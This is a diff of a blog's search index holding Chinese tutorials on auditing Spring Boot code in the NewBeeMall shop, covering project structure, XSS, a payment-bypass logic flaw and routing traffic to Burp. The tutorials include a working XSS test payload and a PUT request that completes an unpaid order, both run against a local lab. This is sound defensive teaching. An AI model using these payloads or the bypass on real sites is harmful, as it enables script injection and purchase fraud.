+<h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><p><code>common/</code>: 存放通用类，如工具类和通用返回结果</p>
+<p><code>config/</code>: 存放配置文件</p>
+<p><code>controller/</code>: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等。</p>
+<p><code>dao/</code>: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口</p>
+<p><code>entity/</code>: 存放实体类</p>
+<p><code>interceptor/</code>: 拦截器</p>
+<p><code>service/</code>: 存放服务类，负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。</p>
+<p><code>utils/</code>: 存放工具类</p>
+<p><code>NewBeeMallApplication.java</code>: Spring Boot启动类</p>
+<p>非该项目，但可能存在的文件夹：</p>
+<p><code>dto/</code>:  存放数据传输对象（Data Transfer Object），如请求参数和返回结果</p>
+<p><code>vo/</code>:  视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全</p>
+<p><code>constant/</code>:  存放常量</p>
+<p><code>filter/</code>: 存放过滤器</p>
+<p><code>component/</code>: 存放组件</p>
+<h2 id="资源目录结构"><a href="#资源目录结构" class="headerlink" title="资源目录结构"></a>资源目录结构</h2><p>在<code>src/main/resources</code>下存放资源文件</p>
+<p><code>mapper/</code>: 存放Mybaits的mapper.xml文件</p>
+<p><code>static/</code>: 静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问</p>
+<p><code>templates/</code>: 存放模版文件</p>
+<p><code>application.properties</code>: Spring Boot默认配置文件</p>
+<p>非该项目，但可能存在的文件：</p>
+<p><code>META-INF/</code>: 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务</p>
+<p><code>i18n/</code>: 国际化文件的简称，来源是英文单词internationalization的首末字符i和n，18为中间的字符数</p>
+<h2 id="其他结构"><a href="#其他结构" class="headerlink" title="其他结构"></a>其他结构</h2><p>⚠️ Spring Boot无需配置 <code>web.xml</code>，但在其他Java项目中，<code>web.xml</code>是一个非常重要的文件，用来配置Servlet、Filter、Listener等。</p>
+<p><code>pom.xml</code>: maven的配置文件，记录项目信息、依赖信息、构建配置等</p>
+<p>如果使用gradle进行自动化构建，则会存在<code>build.gradle</code>文件</p>
+<h1 id="请求传递流程"><a href="#请求传递流程" class="headerlink" title="请求传递流程"></a>请求传递流程</h1><p>Java审计难上手的一大因素是Java一般都是大中型系统，架构相比于PHP开发的小系统会复杂很多，大型系统开发过程中难免出现不规范的编码习惯，再加上函数调用错综复杂，审计代码时光弄明白程序逻辑，理解程序员的编码习惯就要花费大量精力了。</p>
+<p>首先弄明白请求流程的处理，知道用户请求内容会经过哪些代码才能理解程序处理逻辑，可以对我们后续的审计提供非常大的帮助。</p>
+<p>用户的请求发送给服务器之后，中间件（案例项目使用的是Tomcat）会将请求解析发送给Spring的<code>DispatcherServlet</code>，<code>DispatcherServlet</code>的作用是分配请求，详细的过程我们暂时不深入。只需要知道中间件解析请求之后请求会经过Filter和Interceptor。Filter（过滤器）和Interceptor（拦截器）做的事很相似，但他们的触发时机不同，且Interceptor只在Spring中生效，它们可以用来对请求进行过滤字符、拦截、鉴权、日志记录等功能，简单说就是可以在参数进入应用前对其处理，做到全局的处理。</p>
+<p>请求经过Filter和Interceptor之后会被<code>DispatcherServlet</code>分配到对应路径的Controller（控制器），文件名为<code>ExampleController</code>，Controller负责简单的逻辑处理和参数校验功能，之后调用Service。</p>
+<p>Service主要负责业务模块逻辑处理。Service层中有两种类，一是接口类，文件名为<code>ExampleService</code>，用来声明接口；二是接口实现类，文件名为<code>ExampleServiceImpl</code>，作为实现类实现接口中的方法。实现的代码都在<code>ExampleServiceImpl</code>中。当Service涉及到数据库操作时就会调用Dao。</p>
+<p>Dao主要负责数据库的操作，由于使用Mybatis作为ORM框架，只做中间传递的作用，所有SQL语句都是写在配置文件中的，配置文件名为<code>ExampleMapper.xml</code>，存放在<code>src/main/resources/mapper</code>中。</p>
+<p>从用户请求到服务器处理的主要过程如下图所示（省略了<code>DispatcherServlet</code>）：</p>
+<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-path.png" alt="request-path" style="zoom:50%;">
+
+
+
+<p>为了更好理解，以「保存订单」功能为例，主要的请求流程如下图，不了解Spring请求传递的同学可以在代码中跟一遍请求流程，会加深请求传递的印象。</p>
+<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-example.png" alt="request-example" style="zoom:50%;">]]></content>
   </entry>
   <entry>
     <title>Java SpringBoot框架代码审计一 - 前期准备</title>
@@ -721,130 +770,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Java SpringBoot框架代码审计二 - Spring Boot项目结构介绍</title>
-    <url>/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/</url>
-    <content><![CDATA[<h1 id="Spring-Boot项目结构"><a href="#Spring-Boot项目结构" class="headerlink" title="Spring Boot项目结构"></a>Spring Boot项目结构</h1><p>一个简单Spring Boot项目的目录结构如下图</p>
-<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/springboot-directory.png" alt="springboot-directory" style="zoom:33%;">
-
-<a id="more"></a>
-
-<p>Java代码都在<code>src/main/java/</code>目录下，<code>src/main/resources/</code>中放置资源文件。</p>
-<h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><p><code>common/</code>: 存放通用类，如工具类和通用返回结果</p>
-<p><code>config/</code>: 存放配置文件</p>
-<p><code>controller/</code>: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等。</p>
-<p><code>dao/</code>: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口</p>
-<p><code>entity/</code>: 存放实体类</p>
-<p><code>interceptor/</code>: 拦截器</p>
-<p><code>service/</code>: 存放服务类，负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。</p>
-<p><code>utils/</code>: 存放工具类</p>
-<p><code>NewBeeMallApplication.java</code>: Spring Boot启动类</p>
-<p>非该项目，但可能存在的文件夹：</p>
-<p><code>dto/</code>:  存放数据传输对象（Data Transfer Object），如请求参数和返回结果</p>
-<p><code>vo/</code>:  视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全</p>
-<p><code>constant/</code>:  存放常量</p>
-<p><code>filter/</code>: 存放过滤器</p>
-<p><code>component/</code>: 存放组件</p>
-<h2 id="资源目录结构"><a href="#资源目录结构" class="headerlink" title="资源目录结构"></a>资源目录结构</h2><p>在<code>src/main/resources</code>下存放资源文件</p>
-<p><code>mapper/</code>: 存放Mybaits的mapper.xml文件</p>
-<p><code>static/</code>: 静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问</p>
-<p><code>templates/</code>: 存放模版文件</p>
-<p><code>application.properties</code>: Spring Boot默认配置文件</p>
-<p>非该项目，但可能存在的文件：</p>
-<p><code>META-INF/</code>: 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务</p>
-<p><code>i18n/</code>: 国际化文件的简称，来源是英文单词internationalization的首末字符i和n，18为中间的字符数</p>
-<h2 id="其他结构"><a href="#其他结构" class="headerlink" title="其他结构"></a>其他结构</h2><p>⚠️ Spring Boot无需配置 <code>web.xml</code>，但在其他Java项目中，<code>web.xml</code>是一个非常重要的文件，用来配置Servlet、Filter、Listener等。</p>
-<p><code>pom.xml</code>: maven的配置文件，记录项目信息、依赖信息、构建配置等</p>
-<p>如果使用gradle进行自动化构建，则会存在<code>build.gradle</code>文件</p>
-<h1 id="请求传递流程"><a href="#请求传递流程" class="headerlink" title="请求传递流程"></a>请求传递流程</h1><p>Java审计难上手的一大因素是Java一般都是大中型系统，架构相比于PHP开发的小系统会复杂很多，大型系统开发过程中难免出现不规范的编码习惯，再加上函数调用错综复杂，审计代码时光弄明白程序逻辑，理解程序员的编码习惯就要花费大量精力了。</p>
-<p>首先弄明白请求流程的处理，知道用户请求内容会经过哪些代码才能理解程序处理逻辑，可以对我们后续的审计提供非常大的帮助。</p>
-<p>用户的请求发送给服务器之后，中间件（案例项目使用的是Tomcat）会将请求解析发送给Spring的<code>DispatcherServlet</code>，<code>DispatcherServlet</code>的作用是分配请求，详细的过程我们暂时不深入。只需要知道中间件解析请求之后请求会经过Filter和Interceptor。Filter（过滤器）和Interceptor（拦截器）做的事很相似，但他们的触发时机不同，且Interceptor只在Spring中生效，它们可以用来对请求进行过滤字符、拦截、鉴权、日志记录等功能，简单说就是可以在参数进入应用前对其处理，做到全局的处理。</p>
-<p>请求经过Filter和Interceptor之后会被<code>DispatcherServlet</code>分配到对应路径的Controller（控制器），文件名为<code>ExampleController</code>，Controller负责简单的逻辑处理和参数校验功能，之后调用Service。</p>
-<p>Service主要负责业务模块逻辑处理。Service层中有两种类，一是接口类，文件名为<code>ExampleService</code>，用来声明接口；二是接口实现类，文件名为<code>ExampleServiceImpl</code>，作为实现类实现接口中的方法。实现的代码都在<code>ExampleServiceImpl</code>中。当Service涉及到数据库操作时就会调用Dao。</p>
-<p>Dao主要负责数据库的操作，由于使用Mybatis作为ORM框架，只做中间传递的作用，所有SQL语句都是写在配置文件中的，配置文件名为<code>ExampleMapper.xml</code>，存放在<code>src/main/resources/mapper</code>中。</p>
-<p>从用户请求到服务器处理的主要过程如下图所示（省略了<code>DispatcherServlet</code>）：</p>
-<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-path.png" alt="request-path" style="zoom:50%;">
-
-
-
-<p>为了更好理解，以「保存订单」功能为例，主要的请求流程如下图，不了解Spring请求传递的同学可以在代码中跟一遍请求流程，会加深请求传递的印象。</p>
-<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/request-example.png" alt="request-example" style="zoom:50%;">]]></content>
-  </entry>
-  <entry>
-    <title>Java SpringBoot框架代码审计四 - XSS</title>
-    <url>/2020/05/03/JavaSpringBootCodeAudit-4-XSS/</url>
-    <content><![CDATA[<p>XSS我们都知道是由于字符不过滤或过滤不完善导致的，也都知道修复方法。但是在程序中哪个位置进行字符过滤，是很多渗透测试人员不了解的。不了解字符过滤在程序中的所处的位置，是不能在代码审计中找到XSS的。</p>
-<a id="more"></a>
-
-<h1 id="XSS代码审计过程"><a href="#XSS代码审计过程" class="headerlink" title="XSS代码审计过程"></a>XSS代码审计过程</h1><p>我们先从开发者的视角来看，假设一个系统有100个可输入字符的功能点，现在我需要做XSS防护，那么我是不是要在这100个功能点前都做一遍XSS字符过滤呢？都做一遍的话开发可能得累死，而且每个功能点还需要重新进行测试，整个过程下来消耗大量的人力。</p>
-<p>就算一个一个功能点加完字符过滤，那以后项目有新需求，重新添加功能怎么办呢？又给每个功能添加XSS字符过滤？那别的工作还要不要做了。</p>
-<p>所以XSS修复并不是单独进行的，往往是通过Filter或者Interceptor来全局处理。Filter或Interceptor在请求进入Controller前，对请求内容进行处理。这样可以做到统一的字符处理，不用在每个功能点前单独对用户传入的字符进行XSS过滤。</p>
-<p>在代码审计中，找XSS漏洞第一件事是先判断程序中是否存在Filter或者Interceptor。</p>
-<p>一个理想的XSS流程处理的简略图如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
-<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/payload-request-path.png" alt="payload-request-path" style="zoom:50%;">
-
-
-
-<p>回到项目结构中来，我们发现其中没有配置任何filter，只有interceptor（拦截器）。Filter和interceptor做的事很相似，但他们的触发时机不同，且interceptor只在Spring中生效，具体差别可以搜索引擎中搜索查看。</p>
-<p>在项目代码中查找发现不存在filter，只有三个interceptor，分别是：<code>AdminLoginInterceptor</code>、<code>NewBeeMallCartNumberInterceptor</code>、<code>NewBeeMallLoginInterceptor</code>。从文件名来判断就知道不存在XSS相关的拦截器。</p>
-<p>可以判断该应用程序中很可能存在XSS。</p>
-<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/do-not-exist-filter.png" alt="do-not-exist-filter" style="zoom:33%;">
-
-
-
-<p>我们先来实际测试一下XSS，在首页搜索框中输入XSS payload <code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try.png" alt="xss-first-try"></p>
-<p>查看返回结果，咦奇怪，怎么XSS payload没有触发呢？</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try-response.png" alt="xss-first-try-response"></p>
-<p>抓包看一下，确定是XSS payload中的<code>&quot;&lt;&gt;</code>被转义了</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-first-try.png" alt="burp-xss-first-try"></p>
-<p>我们下断点调试看一下，传进来的keyword确实是<code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>，传入Web系统的过程中没有转义处理，那问题出在哪里呢？</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/debug-xss-first-try.png" alt="debug-xss-first-try"></p>
-<p>其实转义出现在输出到模版的过程中，系统使用了thymeleaf作为模版引擎，可以处理HTML，XML，JavaScript，CSS。thymeleaf有自己的XSS转义方法，thymeleaf模版在对<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，所以我们输入的XSS payload是在输出时被转义的。</p>
-<p><code>/src/main/resources/templates/mall/search.html:33</code></p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/thymeleaf-transfer.png" alt="thymeleaf-transfer"></p>
-<p>此时XSS payload传递路径如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
-<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-request-path.png" alt="xss-request-path" style="zoom:50%;">
-
-<p>弄明白XSS payload被转义的原理之后，我们可以转换思路：</p>
-<ol>
-<li>找thymeleaf未作转义的输出，<code>th:utext</code>不会将字符转义</li>
-</ol>
-<p>发现以下模版中存在<code>th:utext</code>，所以这两个功能点存在XSS。其中第二个，<code>detail.html</code>因为显示的是商品信息，商品信息使用富文本编辑器，不能简单的转义处理，需要考虑正常的html标签传输，所以作者在这里使用<code>th:utext</code>来显示商品详细。</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/search-not-transferred.png" alt="search-not-transferred"></p>
-<ol start="2">
-<li>找不经过thymeleaf的输出</li>
-</ol>
-<p>在后台，商品信息编辑中输入XSS payload，点击保存</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/not-through-thymeleaf.png" alt="not-through-thymeleaf"></p>
-<p>发现触发我们输入的XSS payload</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-exploit.png" alt="xss-exploit"></p>
-<p>我们可以抓包看一下，商品信息使用jqGrid传输，将返回的json显示到网页中，该过程没有对字符串进行转义，导致XSS漏洞产生。</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-second-try.png" alt="burp-xss-second-try"></p>
-<p>除以上举例之外，系统还存在多处XSS，在此就不一一列举，大家有兴趣的话可以自己试着找找。 </p>
-<h1 id="XSS-修复"><a href="#XSS-修复" class="headerlink" title="XSS 修复"></a>XSS 修复</h1><p>预防存储型和反射型XSS的代码有两种常见方法：</p>
-<ol>
-<li>对HTML做充分转义</li>
-</ol>
-<p>转义一般在filter或interceptor中做，如何添加xss filter网上有很多资料可以参考，比如 <a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a> ，就不在此赘述。</p>
-<p>XSS难以消灭其中一个因素是功能需求与转义相背，比如filter转义把json中的双引号转义导致json无法解析；富文本编辑器就不能转义正常用户所需的html标签，需要额外对允许输入的标签做一个白名单过滤；大于小于号的比较，输入<code>1&lt;2</code>，转义就变成了<code>1 &amp;lt; 2</code>导致功能失效等。</p>
-<p>修复过程中得结合考虑实际的业务场景。</p>
-<ol start="2">
-<li>改成纯前端渲染，避免直接输出html字符，把代码和数据完全分隔开，但是又需要注意DOM XSS的问题。</li>
-</ol>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>除了存储型和反射型XSS，还有DOM型XSS，因为它属于前端JavaScript的范畴，和后端Java代码没有关系，所以我没在本文中提及。</p>
-<p>HttpOnly属性：SpringBoot默认为会话cookie开启httponly，审计时检查是否存在<code>server.servlet.session.cookie.http-only</code>属性，如果存在的话检查其是否被改为false</p>
-<p>CSP：在响应头中添加<code>X-Content-Security-Policy</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebSecurityConfig</span> <span class="keyword">extends</span></span></span><br><span class="line"><span class="class">	<span class="title">WebSecurityConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		http</span><br><span class="line">			<span class="comment">// ...</span></span><br><span class="line">			.headers()</span><br><span class="line">				.addHeaderWriter(<span class="keyword">new</span> StaticHeadersWriter(<span class="string">"X-Content-Security-Policy"</span>,<span class="string">"script-src 'self'"</span>))</span><br><span class="line">			<span class="comment">// ...</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">https://tech.meituan.com/2018/09/27/fe-security.html</a></p>
-<p><a href="https://blog.csdn.net/heweimingming/article/details/79993591" target="_blank" rel="noopener">https://blog.csdn.net/heweimingming/article/details/79993591</a></p>
-<p><a href="https://juejin.im/entry/59bcdb34f265da06461884a4" target="_blank" rel="noopener">https://juejin.im/entry/59bcdb34f265da06461884a4</a></p>
-<p><a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>Java SpringBoot框架代码审计五 - 越权</title>
     <url>/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/</url>
     <content><![CDATA[<p>越权分为三部分讲解：1. 未授权访问；2. 垂直越权；3. 水平越权</p>
@@ -957,6 +882,32 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Java SpringBoot框架代码审计七 - 逻辑漏洞</title>
+    <url>/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/</url>
+    <content><![CDATA[<p>逻辑漏洞不像之前介绍的漏洞有一套固定的审计流程，每个逻辑漏洞背后的代码都不一样。通过纯白盒去找逻辑漏洞是比较费劲的，首先需要彻底了解业务，再带着各种疑问和奇怪的想法去审。</p>
+<a id="more"></a>
+
+<h1 id="逻辑漏洞代码审计过程"><a href="#逻辑漏洞代码审计过程" class="headerlink" title="逻辑漏洞代码审计过程"></a>逻辑漏洞代码审计过程</h1><p>用户正常的购物过程是<code>添加购物车-&gt;下单-&gt;付款-&gt;出库-&gt;交易成功</code>，但程序在购物过程中没有对前一步进行校验。下订单但未支付时，访问<code>/orders/{orderNo}/finish</code>可直接完成交易。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</span></span><br><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/orders/&#123;orderNo&#125;/finish"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">finishOrder</span><span class="params">(@PathVariable(<span class="string">"orderNo"</span>)</span> String orderNo, HttpSession httpSession) </span>&#123;</span><br><span class="line">	NewBeeMallUserVO user = (NewBeeMallUserVO) httpSession.getAttribute(Constants.MALL_USER_SESSION_KEY);</span><br><span class="line">	String finishOrderResult = newBeeMallOrderService.finishOrder(orderNo, user.getUserId());</span><br><span class="line">	<span class="keyword">if</span> (ServiceResultEnum.SUCCESS.getResult().equals(finishOrderResult)) &#123;</span><br><span class="line">		<span class="keyword">return</span> ResultGenerator.genSuccessResult();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> ResultGenerator.genFailResult(finishOrderResult);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从代码中可以看到直接调用<code>newBeeMallOrderService.finishOrder(orderNo, user.getUserId())</code>，对于该订单是否支付，是否出库等过程都没有校验。</p>
+<h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>随便添加一件物品到购物车，提交订单</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/submit-order.png" alt="submit-order"></p>
+<p>此时来到订单详情页面，按正常逻辑来下一步是付款操作</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/pay-order.png" alt="pay-order"></p>
+<p>在管理页面确认该订单当前状态是待支付</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/wait-for-payment.png" alt="wait-for-payment"></p>
+<p>使用PUT方法访问<code>http://localhost:8089/orders/15886680589866584/finish</code>即可直接完成订单</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/bypass-pay-order.png" alt="bypass-pay-order"></p>
+<p>因为代码使用的是<code>@PutMapping</code>，所以只能使用PUT方法访问，其他请求方法不会被执行</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/finishOrder.png" alt="finishOrder"></p>
+<p>再次查看订单，已经交易成功</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/paid-success.png" alt="paid-success"></p>
+<p>在管理页面查看该订单，证明交易成功。</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/show-orders.png" alt="show-orders"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Java SpringBoot框架代码审计六 - CSRF</title>
     <url>/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/</url>
     <content><![CDATA[<p>CSRF真正和代码相关的内容不太多，主要还是看过滤器和拦截器。代码审计中的思路是检查是否校验Referer、是否给cookie设置SameSite属性和敏感操作是否会生成CSRF token，如果都不存在再查看请求参数中是否存在不可被攻击者猜测的字段，比如验证码等参数。</p>
@@ -1011,32 +962,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Java SpringBoot框架代码审计七 - 逻辑漏洞</title>
-    <url>/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/</url>
-    <content><![CDATA[<p>逻辑漏洞不像之前介绍的漏洞有一套固定的审计流程，每个逻辑漏洞背后的代码都不一样。通过纯白盒去找逻辑漏洞是比较费劲的，首先需要彻底了解业务，再带着各种疑问和奇怪的想法去审。</p>
-<a id="more"></a>
-
-<h1 id="逻辑漏洞代码审计过程"><a href="#逻辑漏洞代码审计过程" class="headerlink" title="逻辑漏洞代码审计过程"></a>逻辑漏洞代码审计过程</h1><p>用户正常的购物过程是<code>添加购物车-&gt;下单-&gt;付款-&gt;出库-&gt;交易成功</code>，但程序在购物过程中没有对前一步进行校验。下订单但未支付时，访问<code>/orders/{orderNo}/finish</code>可直接完成交易。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</span></span><br><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/orders/&#123;orderNo&#125;/finish"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">finishOrder</span><span class="params">(@PathVariable(<span class="string">"orderNo"</span>)</span> String orderNo, HttpSession httpSession) </span>&#123;</span><br><span class="line">	NewBeeMallUserVO user = (NewBeeMallUserVO) httpSession.getAttribute(Constants.MALL_USER_SESSION_KEY);</span><br><span class="line">	String finishOrderResult = newBeeMallOrderService.finishOrder(orderNo, user.getUserId());</span><br><span class="line">	<span class="keyword">if</span> (ServiceResultEnum.SUCCESS.getResult().equals(finishOrderResult)) &#123;</span><br><span class="line">		<span class="keyword">return</span> ResultGenerator.genSuccessResult();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> ResultGenerator.genFailResult(finishOrderResult);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从代码中可以看到直接调用<code>newBeeMallOrderService.finishOrder(orderNo, user.getUserId())</code>，对于该订单是否支付，是否出库等过程都没有校验。</p>
-<h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>随便添加一件物品到购物车，提交订单</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/submit-order.png" alt="submit-order"></p>
-<p>此时来到订单详情页面，按正常逻辑来下一步是付款操作</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/pay-order.png" alt="pay-order"></p>
-<p>在管理页面确认该订单当前状态是待支付</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/wait-for-payment.png" alt="wait-for-payment"></p>
-<p>使用PUT方法访问<code>http://localhost:8089/orders/15886680589866584/finish</code>即可直接完成订单</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/bypass-pay-order.png" alt="bypass-pay-order"></p>
-<p>因为代码使用的是<code>@PutMapping</code>，所以只能使用PUT方法访问，其他请求方法不会被执行</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/finishOrder.png" alt="finishOrder"></p>
-<p>再次查看订单，已经交易成功</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/paid-success.png" alt="paid-success"></p>
-<p>在管理页面查看该订单，证明交易成功。</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/show-orders.png" alt="show-orders"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>使用Packet Filter将Mac热点中的流量转发到Burp</title>
     <url>/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/</url>
     <content><![CDATA[<p>一般情况下，Burp抓手机APP的HTTP/HTTPS请求时可在系统代理或者VPN代理软件上设置代理服务器，但是部分APP存在代理检测，发现存在代理则退出应用，或是部分APP的请求不通过代理。此时可利用Packet Filter将手机流量转发到Burp代理上，避免以上情况发生，从而抓到请求包。</p>
@@ -1072,6 +997,81 @@
 <p>⚠️：还原设定时只需执行：<code>sudo pfctl -evf /etc/pf.conf</code>，并且重启热点</p>
 <p><code>sudo pfctl -d</code>关闭packet filter</p>
 <p>总结：本质上是通过防火墙将某张网卡的流量转发到Burp。在Linux和Windows操作系统中配合防火墙进行流量转发能得到同样的效果。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java SpringBoot框架代码审计四 - XSS</title>
+    <url>/2020/05/03/JavaSpringBootCodeAudit-4-XSS/</url>
+    <content><![CDATA[<p>XSS我们都知道是由于字符不过滤或过滤不完善导致的，也都知道修复方法。但是在程序中哪个位置进行字符过滤，是很多渗透测试人员不了解的。不了解字符过滤在程序中的所处的位置，是不能在代码审计中找到XSS的。</p>
+<a id="more"></a>
+
+<h1 id="XSS代码审计过程"><a href="#XSS代码审计过程" class="headerlink" title="XSS代码审计过程"></a>XSS代码审计过程</h1><p>我们先从开发者的视角来看，假设一个系统有100个可输入字符的功能点，现在我需要做XSS防护，那么我是不是要在这100个功能点前都做一遍XSS字符过滤呢？都做一遍的话开发可能得累死，而且每个功能点还需要重新进行测试，整个过程下来消耗大量的人力。</p>
+<p>就算一个一个功能点加完字符过滤，那以后项目有新需求，重新添加功能怎么办呢？又给每个功能添加XSS字符过滤？那别的工作还要不要做了。</p>
+<p>所以XSS修复并不是单独进行的，往往是通过Filter或者Interceptor来全局处理。Filter或Interceptor在请求进入Controller前，对请求内容进行处理。这样可以做到统一的字符处理，不用在每个功能点前单独对用户传入的字符进行XSS过滤。</p>
+<p>在代码审计中，找XSS漏洞第一件事是先判断程序中是否存在Filter或者Interceptor。</p>
+<p>一个理想的XSS流程处理的简略图如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
+<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/payload-request-path.png" alt="payload-request-path" style="zoom:50%;">
+
+
+
+<p>回到项目结构中来，我们发现其中没有配置任何filter，只有interceptor（拦截器）。Filter和interceptor做的事很相似，但他们的触发时机不同，且interceptor只在Spring中生效，具体差别可以搜索引擎中搜索查看。</p>
+<p>在项目代码中查找发现不存在filter，只有三个interceptor，分别是：<code>AdminLoginInterceptor</code>、<code>NewBeeMallCartNumberInterceptor</code>、<code>NewBeeMallLoginInterceptor</code>。从文件名来判断就知道不存在XSS相关的拦截器。</p>
+<p>可以判断该应用程序中很可能存在XSS。</p>
+<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/do-not-exist-filter.png" alt="do-not-exist-filter" style="zoom:33%;">
+
+
+
